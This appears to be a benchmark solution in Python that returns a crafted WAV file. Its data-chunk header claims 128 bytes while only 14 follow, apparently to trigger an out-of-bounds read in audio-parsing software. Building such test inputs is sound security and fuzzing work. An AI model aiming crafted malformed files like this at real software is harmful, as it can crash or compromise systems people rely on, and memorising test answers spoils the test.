import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        return bytes([
            0x52, 0x49, 0x46, 0x46,  # 'RIFF'
            0x32, 0x00, 0x00, 0x00,  # ChunkSize = 50 (file size - 8)
            0x57, 0x41, 0x56, 0x45,  # 'WAVE'
            0x66, 0x6D, 0x74, 0x20,  # 'fmt '
            0x10, 0x00, 0x00, 0x00,  # Subchunk1Size = 16
            0x01, 0x00,              # AudioFormat = 1 (PCM)
            0x01, 0x00,              # NumChannels = 1
            0x44, 0xAC, 0x00, 0x00,  # SampleRate = 44100
            0x88, 0x58, 0x01, 0x00,  # ByteRate = 88200
            0x02, 0x00,              # BlockAlign = 2
            0x10, 0x00,              # BitsPerSample = 16
            0x64, 0x61, 0x74, 0x61,  # 'data'
            0x80, 0x00, 0x00, 0x00,  # Subchunk2Size = 128 (larger than actual data)
            0x00, 0x00, 0x00, 0x00,  # 14 bytes of actual data (truncated vs declared size)
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00
        ])